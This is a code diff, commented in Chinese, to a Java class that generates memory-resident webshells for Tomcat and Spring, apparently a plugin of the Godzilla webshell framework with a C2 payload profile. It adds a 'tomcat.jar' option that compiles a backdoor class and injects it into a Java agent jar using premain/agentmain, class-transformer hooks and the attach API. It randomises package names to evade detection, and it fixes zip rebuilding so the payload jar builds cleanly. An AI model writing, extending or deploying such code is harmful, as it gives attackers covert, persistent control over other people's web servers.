@@ -33,7 +33,13 @@ import util.functions;
 @C2ProfileTemplate(
         supportPayload = "JavaDynamicPayload",
         templateName = "MemoryShell",
-        supportType = {"tomcat.class", "tomcat.java", "spring.class","spring.java","agent.jar", "spring.jar"}
+        // agent.jar 已移除（2026-10-30）：agent.javax 的 {code} 占位符全工程无人替换，生成必抛
+        // "内存马模板 Java 编译失败"；jar 内自带的 CoreClassLoader 参考实现也只是 hack/ccc PoC。
+        // 需要 agent 路线时须先补全 agent.javax 协议体（可移植 springMemoryShell.javax 的 entry）。
+        // tomcat.jar（2026-10-30 新增）：与 spring.jar 同款 agent 流程——编译产物改名 com.security.CoreClassLoader
+        // 替换进 GodzillaWebAgent.jar 资源（premain/agentmain + ClassFileTransformer 钩子 + attach API），
+        // 整包 com/security 随机化；equals(new Object[]{req,resp}) 契约与 tomcat 模板 entry 同构。
+        supportType = {"tomcat.class", "tomcat.java", "tomcat.jar", "spring.class","spring.java", "spring.jar"}
 )
 public class JavaMemoryShellTemplate extends JavaJspTemplate {
     protected static final String[] packerNames = new String[]{"org", "net", "sun", "javax", "com", "dev", "us", "xyz", "gov", "edu"};
@@ -91,9 +97,9 @@ public class JavaMemoryShellTemplate extends JavaJspTemplate {
                 this.isGenerateClass = false;
                 this.javaCodeTemplate = "springMemoryShell.javax";
                 break;
-            case "agent.jar":
+            case "tomcat.jar":
                 this.isGenerateClass = true;
-                this.javaCodeTemplate = "agent.javax";
+                this.javaCodeTemplate = "tomcatMemoryShell.javax";
                 break;
             case "spring.jar":
                 this.isGenerateClass = true;
@@ -234,7 +240,7 @@ public class JavaMemoryShellTemplate extends JavaJspTemplate {
             }
             ClassPool classPool;
             CtClass ctClass;
-            if (this.userSelectTemplateName.equals("agent.jar") || this.userSelectTemplateName.equals("spring.jar")) {
+            if (this.userSelectTemplateName.equals("spring.jar") || this.userSelectTemplateName.equals("tomcat.jar")) {
                 classPool = new ClassPool(true);
                 classPool.insertClassPath(new LoaderClassPath(JavaMemoryShellTemplate.class.getClassLoader()));
                 ctClass = classPool.makeClass(new ByteArrayInputStream(classBytes));
@@ -250,14 +256,22 @@ public class JavaMemoryShellTemplate extends JavaJspTemplate {
                 ZipOutputStream zipOutputStream = new ZipOutputStream(byteArrayOutputStream);
 
                 for(ZipEntry zipEntry = null; (zipEntry = zipInputStream.getNextEntry()) != null; zipOutputStream.closeEntry()) {
-                    zipOutputStream.putNextEntry((ZipEntry)zipEntry.clone());
+                    ZipEntry outEntry = (ZipEntry)zipEntry.clone();
+                    byte[] zipEntryBytes = null;
                     if (!zipEntry.isDirectory()) {
-                        byte[] zipEntryBytes = functions.readInputStream(zipInputStream);
+                        zipEntryBytes = functions.readInputStream(zipInputStream);
                         if (zipEntry.getName().equals("com/security/CoreClassLoader.class")) {
                             zipEntryBytes = classBytes;
-                            zipEntry.setSize((long)classBytes.length);
+                            // 该条目内容已被替换，克隆体上残留的是源 jar 的 size/csize/crc。
+                            // 源 jar 此条目未使用 data descriptor，putNextEntry 会把这些旧值直接写进
+                            // local header，closeEntry 校验时即抛 ZipException: invalid entry size。
+                            // 换成全新 entry（size/csize/crc 均为 -1）让 ZipOutputStream 走 data descriptor。
+                            outEntry = new ZipEntry(zipEntry.getName());
                         }
+                    }
 
+                    zipOutputStream.putNextEntry(outEntry);
+                    if (!zipEntry.isDirectory()) {
                         zipOutputStream.write(zipEntryBytes);
                     }
                 }
